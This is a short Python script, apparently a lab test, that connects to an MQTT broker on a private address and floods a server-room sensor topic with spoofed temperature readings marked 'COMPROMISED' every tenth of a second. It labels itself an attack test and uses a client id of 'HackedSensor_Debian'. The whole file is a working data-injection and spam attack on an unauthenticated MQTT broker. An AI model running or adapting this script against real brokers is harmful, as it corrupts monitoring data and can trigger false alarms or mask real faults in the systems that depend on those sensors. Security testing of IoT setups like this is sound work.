import time
import json
import random
import paho.mqtt.client as mqtt

BROKER = "192.168.50.171"
PORT = 1883
TOPIC = "cyberspace/capteurs/salle-serveur"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, "HackedSensor_Debian")
client.connect(BROKER, PORT)

print("Attack test")

try:
    while True:
        payload = {
            "temp": random.randint(150, 999), 
            "status": "COMPROMISED"
        }
        
        client.publish(TOPIC, json.dumps(payload))
        print(f"Spam: {payload}")
        
        time.sleep(0.1)
        
except KeyboardInterrupt:
    print("\nAttaque interrompue par l'utilisateur.")
    client.disconnect()
